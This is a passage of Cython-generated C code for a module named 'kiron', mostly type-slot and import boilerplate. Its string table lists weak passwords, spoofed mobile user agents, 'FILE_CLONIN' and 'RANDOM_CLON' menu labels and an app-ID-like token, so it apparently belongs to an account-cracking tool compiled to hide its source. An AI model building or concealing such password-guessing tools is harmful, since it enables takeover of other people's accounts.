  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE, /*tp_flags*/
  0, /*tp_doc*/
  0, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  #if !CYTHON_USE_TYPE_SPECS
  0, /*tp_dictoffset*/
  #endif
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_5kiron___pyx_scope_struct_3_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  #if CYTHON_USE_TP_FINALIZE
  0, /*tp_finalize*/
  #else
  NULL, /*tp_finalize*/
  #endif
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if __PYX_NEED_TP_PRINT_SLOT == 1
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030C0000
  0, /*tp_watched*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
  0, /*tp_pypy_flags*/
  #endif
};
#endif

#if CYTHON_USE_FREELISTS
static struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr *__pyx_freelist_5kiron___pyx_scope_struct_4_genexpr[8];
static int __pyx_freecount_5kiron___pyx_scope_struct_4_genexpr = 0;
#endif

static PyObject *__pyx_tp_new_5kiron___pyx_scope_struct_4_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  #if CYTHON_COMPILING_IN_LIMITED_API
  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);
  o = alloc_func(t, 0);
  #else
  #if CYTHON_USE_FREELISTS
  if (likely((int)(__pyx_freecount_5kiron___pyx_scope_struct_4_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr)))) {
    o = (PyObject*)__pyx_freelist_5kiron___pyx_scope_struct_4_genexpr[--__pyx_freecount_5kiron___pyx_scope_struct_4_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else
  #endif
  {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  #endif
  return o;
}

static void __pyx_tp_dealloc_5kiron___pyx_scope_struct_4_genexpr(PyObject *o) {
  struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr *p = (struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr *)o;
  #if CYTHON_USE_TP_FINALIZE
  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && !__Pyx_PyObject_GC_IsFinalized(o)) {
    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_5kiron___pyx_scope_struct_4_genexpr) {
      if (PyObject_CallFinalizerFromDealloc(o)) return;
    }
  }
  #endif
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_genexpr_arg_0);
  Py_CLEAR(p->__pyx_v_i);
  Py_CLEAR(p->__pyx_t_0);
  #if CYTHON_USE_FREELISTS
  if (((int)(__pyx_freecount_5kiron___pyx_scope_struct_4_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr)))) {
    __pyx_freelist_5kiron___pyx_scope_struct_4_genexpr[__pyx_freecount_5kiron___pyx_scope_struct_4_genexpr++] = ((struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr *)o);
  } else
  #endif
  {
    #if CYTHON_USE_TYPE_SLOTS || CYTHON_COMPILING_IN_PYPY
    (*Py_TYPE(o)->tp_free)(o);
    #else
    {
      freefunc tp_free = (freefunc)PyType_GetSlot(Py_TYPE(o), Py_tp_free);
      if (tp_free) tp_free(o);
    }
    #endif
  }
}

static int __pyx_tp_traverse_5kiron___pyx_scope_struct_4_genexpr(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr *p = (struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr *)o;
  if (p->__pyx_genexpr_arg_0) {
    e = (*v)(p->__pyx_genexpr_arg_0, a); if (e) return e;
  }
  if (p->__pyx_v_i) {
    e = (*v)(p->__pyx_v_i, a); if (e) return e;
  }
  if (p->__pyx_t_0) {
    e = (*v)(p->__pyx_t_0, a); if (e) return e;
  }
  return 0;
}
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_type_5kiron___pyx_scope_struct_4_genexpr_slots[] = {
  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_5kiron___pyx_scope_struct_4_genexpr},
  {Py_tp_traverse, (void *)__pyx_tp_traverse_5kiron___pyx_scope_struct_4_genexpr},
  {Py_tp_new, (void *)__pyx_tp_new_5kiron___pyx_scope_struct_4_genexpr},
  {0, 0},
};
static PyType_Spec __pyx_type_5kiron___pyx_scope_struct_4_genexpr_spec = {
  "kiron.__pyx_scope_struct_4_genexpr",
  sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr),
  0,
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC|Py_TPFLAGS_HAVE_FINALIZE,
  __pyx_type_5kiron___pyx_scope_struct_4_genexpr_slots,
};
#else

static PyTypeObject __pyx_type_5kiron___pyx_scope_struct_4_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "kiron.""__pyx_scope_struct_4_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_5kiron___pyx_scope_struct_4_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC|Py_TPFLAGS_HAVE_FINALIZE, /*tp_flags*/
  0, /*tp_doc*/
  __pyx_tp_traverse_5kiron___pyx_scope_struct_4_genexpr, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  #if !CYTHON_USE_TYPE_SPECS
  0, /*tp_dictoffset*/
  #endif
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_5kiron___pyx_scope_struct_4_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  #if CYTHON_USE_TP_FINALIZE
  0, /*tp_finalize*/
  #else
  NULL, /*tp_finalize*/
  #endif
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if __PYX_NEED_TP_PRINT_SLOT == 1
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030C0000
  0, /*tp_watched*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
  0, /*tp_pypy_flags*/
  #endif
};
#endif

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

static int __pyx_import_star_set(PyObject *o, PyObject* py_name, char *name) {
  static const char* internal_type_names[] = {
    "__pyx_ctuple_Py_ssize_t",
    "__pyx_ctuple_Py_ssize_t_struct",
    "__pyx_ctuple_double__and_double",
    "__pyx_ctuple_double__and_double_struct",
    "__pyx_ctuple_long",
    "__pyx_ctuple_long__and_long",
    "__pyx_ctuple_long__and_long_struct",
    "__pyx_ctuple_long_struct",
    "__pyx_scope_struct_1_genexpr",
    "__pyx_scope_struct_2_genexpr",
    "__pyx_scope_struct_3_genexpr",
    "__pyx_scope_struct_4_genexpr",
    "__pyx_scope_struct__genexpr",
    0
  };
  const char** type_name = internal_type_names;
  while (*type_name) {
    if (__Pyx_StrEq(name, *type_name)) {
      PyErr_Format(PyExc_TypeError, "Cannot overwrite C type %s", name);
      goto bad;
    }
    type_name++;
  }
  if (0);
  else {
    if (PyObject_SetAttr(__pyx_m, py_name, o) < 0) goto bad;
  }
  return 0;
  bad:
  return -1;
}

static int
__Pyx_import_all_from(PyObject *locals, PyObject *v)
{
    PyObject *all = PyObject_GetAttrString(v, "__all__");
    PyObject *dict, *name, *value;
    int skip_leading_underscores = 0;
    int pos, err;
    if (all == NULL) {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError))
            return -1;
        PyErr_Clear();
        dict = PyObject_GetAttrString(v, "__dict__");
        if (dict == NULL) {
            if (!PyErr_ExceptionMatches(PyExc_AttributeError))
                return -1;
            PyErr_SetString(PyExc_ImportError,
            "from-import-* object has no __dict__ and no __all__");
            return -1;
        }
#if PY_MAJOR_VERSION < 3
        all = PyObject_CallMethod(dict, (char *)"keys", NULL);
#else
        all = PyMapping_Keys(dict);
#endif
        Py_DECREF(dict);
        if (all == NULL)
            return -1;
        skip_leading_underscores = 1;
    }
    for (pos = 0, err = 0; ; pos++) {
        name = PySequence_GetItem(all, pos);
        if (name == NULL) {
            if (!PyErr_ExceptionMatches(PyExc_IndexError))
                err = -1;
            else
                PyErr_Clear();
            break;
        }
        if (skip_leading_underscores &&
#if PY_MAJOR_VERSION < 3
            likely(PyString_Check(name)) &&
            PyString_AS_STRING(name)[0] == '_')
#else
            likely(PyUnicode_Check(name)) &&
            likely(__Pyx_PyUnicode_GET_LENGTH(name)) &&
            __Pyx_PyUnicode_READ_CHAR(name, 0) == '_')
#endif
        {
            Py_DECREF(name);
            continue;
        }
        value = PyObject_GetAttr(v, name);
        if (value == NULL)
            err = -1;
        else if (PyDict_CheckExact(locals))
            err = PyDict_SetItem(locals, name, value);
        else
            err = PyObject_SetItem(locals, name, value);
        Py_DECREF(name);
        Py_XDECREF(value);
        if (err != 0)
            break;
    }
    Py_DECREF(all);
    return err;
}
static int __pyx_import_star(PyObject* m) {
    int i;
    int ret = -1;
    char* s;
    PyObject *locals = 0;
    PyObject *list = 0;
#if PY_MAJOR_VERSION >= 3
    PyObject *utf8_name = 0;
#endif
    PyObject *name;
    PyObject *item;
    locals = PyDict_New();              if (!locals) goto bad;
    if (__Pyx_import_all_from(locals, m) < 0) goto bad;
    list = PyDict_Items(locals);        if (!list) goto bad;
    for(i=0; i<PyList_GET_SIZE(list); i++) {
        name = PyTuple_GET_ITEM(PyList_GET_ITEM(list, i), 0);
        item = PyTuple_GET_ITEM(PyList_GET_ITEM(list, i), 1);
#if PY_MAJOR_VERSION >= 3
        utf8_name = PyUnicode_AsUTF8String(name);
        if (!utf8_name) goto bad;
        s = PyBytes_AS_STRING(utf8_name);
        if (__pyx_import_star_set(item, name, s) < 0) goto bad;
        Py_DECREF(utf8_name); utf8_name = 0;
#else
        s = PyString_AsString(name);
        if (!s) goto bad;
        if (__pyx_import_star_set(item, name, s) < 0) goto bad;
#endif
    }
    ret = 0;
bad:
    Py_XDECREF(locals);
    Py_XDECREF(list);
#if PY_MAJOR_VERSION >= 3
    Py_XDECREF(utf8_name);
#endif
    return ret;
}


#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif
/* #### Code section: pystring_table ### */

static int __Pyx_CreateStringTabAndInitStrings(void) {
  __Pyx_StringTabEntry __pyx_string_tab[] = {
    {&__pyx_kp_s_0, __pyx_k_0, sizeof(__pyx_k_0), 0, 0, 1, 0},
    {&__pyx_kp_u_0, __pyx_k_0, sizeof(__pyx_k_0), 0, 1, 0, 0},
    {&__pyx_kp_u_00, __pyx_k_00, sizeof(__pyx_k_00), 0, 1, 0, 0},
    {&__pyx_kp_s_01, __pyx_k_01, sizeof(__pyx_k_01), 0, 0, 1, 0},
    {&__pyx_kp_u_011_en_us_AppleWebKit_537_36, __pyx_k_011_en_us_AppleWebKit_537_36, sizeof(__pyx_k_011_en_us_AppleWebKit_537_36), 0, 1, 0, 0},
    {&__pyx_kp_s_02, __pyx_k_02, sizeof(__pyx_k_02), 0, 0, 1, 0},
    {&__pyx_kp_s_03, __pyx_k_03, sizeof(__pyx_k_03), 0, 0, 1, 0},
    {&__pyx_kp_s_04, __pyx_k_04, sizeof(__pyx_k_04), 0, 0, 1, 0},
    {&__pyx_kp_s_05, __pyx_k_05, sizeof(__pyx_k_05), 0, 0, 1, 0},
    {&__pyx_kp_s_06, __pyx_k_06, sizeof(__pyx_k_06), 0, 0, 1, 0},
    {&__pyx_kp_s_07, __pyx_k_07, sizeof(__pyx_k_07), 0, 0, 1, 0},
    {&__pyx_kp_s_08, __pyx_k_08, sizeof(__pyx_k_08), 0, 0, 1, 0},
    {&__pyx_kp_s_09, __pyx_k_09, sizeof(__pyx_k_09), 0, 0, 1, 0},
    {&__pyx_kp_s_0_0, __pyx_k_0_0, sizeof(__pyx_k_0_0), 0, 0, 1, 0},
    {&__pyx_kp_u_0_0, __pyx_k_0_0, sizeof(__pyx_k_0_0), 0, 1, 0, 0},
    {&__pyx_kp_s_0_1, __pyx_k_0_1, sizeof(__pyx_k_0_1), 0, 0, 1, 0},
    {&__pyx_kp_s_0_2, __pyx_k_0_2, sizeof(__pyx_k_0_2), 0, 0, 1, 0},
    {&__pyx_kp_u_0_3, __pyx_k_0_3, sizeof(__pyx_k_0_3), 0, 1, 0, 0},
    {&__pyx_kp_u_0_38_5_244m_38_5_46m_EXIT_TOOL, __pyx_k_0_38_5_244m_38_5_46m_EXIT_TOOL, sizeof(__pyx_k_0_38_5_244m_38_5_46m_EXIT_TOOL), 0, 1, 0, 0},
    {&__pyx_kp_u_0_Safari_534, __pyx_k_0_Safari_534, sizeof(__pyx_k_0_Safari_534), 0, 1, 0, 0},
    {&__pyx_kp_u_0_Safari_537_36, __pyx_k_0_Safari_537_36, sizeof(__pyx_k_0_Safari_537_36), 0, 1, 0, 0},
    {&__pyx_kp_u_0_Win64_x64_AppleWebKit_537_36, __pyx_k_0_Win64_x64_AppleWebKit_537_36, sizeof(__pyx_k_0_Win64_x64_AppleWebKit_537_36), 0, 1, 0, 0},
    {&__pyx_kp_s_1, __pyx_k_1, sizeof(__pyx_k_1), 0, 0, 1, 0},
    {&__pyx_kp_s_10, __pyx_k_10, sizeof(__pyx_k_10), 0, 0, 1, 0},
    {&__pyx_kp_s_10000, __pyx_k_10000, sizeof(__pyx_k_10000), 0, 0, 1, 0},
    {&__pyx_kp_s_100000, __pyx_k_100000, sizeof(__pyx_k_100000), 0, 0, 1, 0},
    {&__pyx_kp_s_102030, __pyx_k_102030, sizeof(__pyx_k_102030), 0, 0, 1, 0},
    {&__pyx_kp_u_10_1_YaSearchBrowser, __pyx_k_10_1_YaSearchBrowser, sizeof(__pyx_k_10_1_YaSearchBrowser), 0, 1, 0, 0},
    {&__pyx_kp_s_11, __pyx_k_11, sizeof(__pyx_k_11), 0, 0, 1, 0},
    {&__pyx_kp_s_112233, __pyx_k_112233, sizeof(__pyx_k_112233), 0, 0, 1, 0},
    {&__pyx_kp_s_12, __pyx_k_12, sizeof(__pyx_k_12), 0, 0, 1, 0},
    {&__pyx_kp_s_123123, __pyx_k_123123, sizeof(__pyx_k_123123), 0, 0, 1, 0},
    {&__pyx_kp_s_123456, __pyx_k_123456, sizeof(__pyx_k_123456), 0, 0, 1, 0},
    {&__pyx_kp_s_1234567, __pyx_k_1234567, sizeof(__pyx_k_1234567), 0, 0, 1, 0},
    {&__pyx_kp_s_12345678, __pyx_k_12345678, sizeof(__pyx_k_12345678), 0, 0, 1, 0},
    {&__pyx_kp_s_123456789, __pyx_k_123456789, sizeof(__pyx_k_123456789), 0, 0, 1, 0},
    {&__pyx_kp_s_1234567890, __pyx_k_1234567890, sizeof(__pyx_k_1234567890), 0, 0, 1, 0},
    {&__pyx_kp_u_136_Mobile_Safari, __pyx_k_136_Mobile_Safari, sizeof(__pyx_k_136_Mobile_Safari), 0, 1, 0, 0},
    {&__pyx_kp_s_13_Pro, __pyx_k_13_Pro, sizeof(__pyx_k_13_Pro), 0, 0, 1, 0},
    {&__pyx_kp_u_1_0, __pyx_k_1_0, sizeof(__pyx_k_1_0), 0, 1, 0, 0},
    {&__pyx_kp_s_1_2, __pyx_k_1_2, sizeof(__pyx_k_1_2), 0, 0, 1, 0},
    {&__pyx_kp_s_1_33m, __pyx_k_1_33m, sizeof(__pyx_k_1_33m), 0, 0, 1, 0},
    {&__pyx_kp_s_1_34m, __pyx_k_1_34m, sizeof(__pyx_k_1_34m), 0, 0, 1, 0},
    {&__pyx_kp_s_1_34m_1_34m_38_5_244m_38_5_46m, __pyx_k_1_34m_1_34m_38_5_244m_38_5_46m, sizeof(__pyx_k_1_34m_1_34m_38_5_244m_38_5_46m), 0, 0, 1, 0},
    {&__pyx_kp_s_1_37m, __pyx_k_1_37m, sizeof(__pyx_k_1_37m), 0, 0, 1, 0},
    {&__pyx_kp_u_1_38_5_244m_38_5_46m_FILE_CLONIN, __pyx_k_1_38_5_244m_38_5_46m_FILE_CLONIN, sizeof(__pyx_k_1_38_5_244m_38_5_46m_FILE_CLONIN), 0, 1, 0, 0},
    {&__pyx_kp_u_1_38_5_244m_38_5_46m_METHOD_38_5, __pyx_k_1_38_5_244m_38_5_46m_METHOD_38_5, sizeof(__pyx_k_1_38_5_244m_38_5_46m_METHOD_38_5), 0, 1, 0, 0},
    {&__pyx_kp_s_1_96m, __pyx_k_1_96m, sizeof(__pyx_k_1_96m), 0, 0, 1, 0},
    {&__pyx_kp_s_1_97m, __pyx_k_1_97m, sizeof(__pyx_k_1_97m), 0, 0, 1, 0},
    {&__pyx_kp_s_1_97m_1_37m, __pyx_k_1_97m_1_37m, sizeof(__pyx_k_1_97m_1_37m), 0, 0, 1, 0},
    {&__pyx_kp_u_1_97m_1_37m, __pyx_k_1_97m_1_37m, sizeof(__pyx_k_1_97m_1_37m), 0, 1, 0, 0},
    {&__pyx_kp_u_1_97m_1_37m_2, __pyx_k_1_97m_1_37m_2, sizeof(__pyx_k_1_97m_1_37m_2), 0, 1, 0, 0},
    {&__pyx_kp_u_1_97m_1_91m_1_92m_1_93m_38_5_46, __pyx_k_1_97m_1_91m_1_92m_1_93m_38_5_46, sizeof(__pyx_k_1_97m_1_91m_1_92m_1_93m_38_5_46), 0, 1, 0, 0},
    {&__pyx_kp_u_1_97m_2, __pyx_k_1_97m_2, sizeof(__pyx_k_1_97m_2), 0, 1, 0, 0},
    {&__pyx_kp_s_1_97m_38_5_244m_1_97m_38_5_244m, __pyx_k_1_97m_38_5_244m_1_97m_38_5_244m, sizeof(__pyx_k_1_97m_38_5_244m_1_97m_38_5_244m), 0, 0, 1, 0},
    {&__pyx_kp_u_1_BroPP_1_0_SA_3_Mobile_Safari, __pyx_k_1_BroPP_1_0_SA_3_Mobile_Safari, sizeof(__pyx_k_1_BroPP_1_0_SA_3_Mobile_Safari), 0, 1, 0, 0},
    {&__pyx_kp_u_1_en_US_AppleWebKit_534, __pyx_k_1_en_US_AppleWebKit_534, sizeof(__pyx_k_1_en_US_AppleWebKit_534), 0, 1, 0, 0},
    {&__pyx_kp_s_2, __pyx_k_2, sizeof(__pyx_k_2), 0, 0, 1, 0},
    {&__pyx_kp_s_203040, __pyx_k_203040, sizeof(__pyx_k_203040), 0, 0, 1, 0},
    {&__pyx_kp_s_210, __pyx_k_210, sizeof(__pyx_k_210), 0, 0, 1, 0},
    {&__pyx_kp_u_25, __pyx_k_25, sizeof(__pyx_k_25), 0, 1, 0, 0},
    {&__pyx_kp_s_28, __pyx_k_28, sizeof(__pyx_k_28), 0, 0, 1, 0},
    {&__pyx_kp_s_29, __pyx_k_29, sizeof(__pyx_k_29), 0, 0, 1, 0},
    {&__pyx_kp_u_2_38_5_244m_38_5_46m_METHOD_38_5, __pyx_k_2_38_5_244m_38_5_46m_METHOD_38_5, sizeof(__pyx_k_2_38_5_244m_38_5_46m_METHOD_38_5), 0, 1, 0, 0},
    {&__pyx_kp_u_2_38_5_244m_38_5_46m_RANDOM_CLON, __pyx_k_2_38_5_244m_38_5_46m_RANDOM_CLON, sizeof(__pyx_k_2_38_5_244m_38_5_46m_RANDOM_CLON), 0, 1, 0, 0},
    {&__pyx_kp_s_2_AYYUB, __pyx_k_2_AYYUB, sizeof(__pyx_k_2_AYYUB), 0, 0, 1, 0},
    {&__pyx_kp_s_3, __pyx_k_3, sizeof(__pyx_k_3), 0, 0, 1, 0},
    {&__pyx_kp_s_350685531728_62f8ce9f74b12f84c12, __pyx_k_350685531728_62f8ce9f74b12f84c12, sizeof(__pyx_k_350685531728_62f8ce9f74b12f84c12), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_121m, __pyx_k_38_5_121m, sizeof(__pyx_k_38_5_121m), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_122m, __pyx_k_38_5_122m, sizeof(__pyx_k_38_5_122m), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_123m, __pyx_k_38_5_123m, sizeof(__pyx_k_38_5_123m), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_14m, __pyx_k_38_5_14m, sizeof(__pyx_k_38_5_14m), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_196m, __pyx_k_38_5_196m, sizeof(__pyx_k_38_5_196m), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_205m, __pyx_k_38_5_205m, sizeof(__pyx_k_38_5_205m), 0, 0, 1, 0},
    {&__pyx_kp_u_38_5_244m, __pyx_k_38_5_244m, sizeof(__pyx_k_38_5_244m), 0, 1, 0, 0},
    {&__pyx_kp_s_38_5_244m_1_97m0_38_5_244m_38_5, __pyx_k_38_5_244m_1_97m0_38_5_244m_38_5, sizeof(__pyx_k_38_5_244m_1_97m0_38_5_244m_38_5), 0, 0, 1, 0},
    {&__pyx_kp_u_38_5_244m_1_97m1_38_5_244m_38_5, __pyx_k_38_5_244m_1_97m1_38_5_244m_38_5, sizeof(__pyx_k_38_5_244m_1_97m1_38_5_244m_38_5), 0, 1, 0, 0},
    {&__pyx_kp_s_38_5_244m_1_97m1_38_5_244m_38_5_2, __pyx_k_38_5_244m_1_97m1_38_5_244m_38_5_2, sizeof(__pyx_k_38_5_244m_1_97m1_38_5_244m_38_5_2), 0, 0, 1, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_10, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_10, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_10), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_11, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_11, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_11), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_12, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_12, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_12), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_13, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_13, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_13), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_14, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_14, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_14), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_15, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_15, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_15), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_16, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_16, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_16), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_17, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_17, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_17), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_18, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_18, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_18), 0, 1, 0, 0},
    {&__pyx_kp_s_38_5_244m_1_97m_38_5_244m_38_5_19, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_19, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_19), 0, 0, 1, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_2, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_2, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_2), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_3, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_3, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_3), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_4, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_4, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_4), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_5, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_5, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_5), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_6, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_6, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_6), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_7, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_7, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_7), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_8, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_8, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_8), 0, 1, 0, 0},
    {&__pyx_kp_s_38_5_244m_1_97m_38_5_244m_38_5_9, __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_9, sizeof(__pyx_k_38_5_244m_1_97m_38_5_244m_38_5_9), 0, 0, 1, 0},
    {&__pyx_kp_u_38_5_244m_2, __pyx_k_38_5_244m_2, sizeof(__pyx_k_38_5_244m_2), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_3, __pyx_k_38_5_244m_3, sizeof(__pyx_k_38_5_244m_3), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_244mAYYUB_OK_38, __pyx_k_38_5_244m_38_5_244mAYYUB_OK_38, sizeof(__pyx_k_38_5_244m_38_5_244mAYYUB_OK_38), 0, 1, 0, 0},
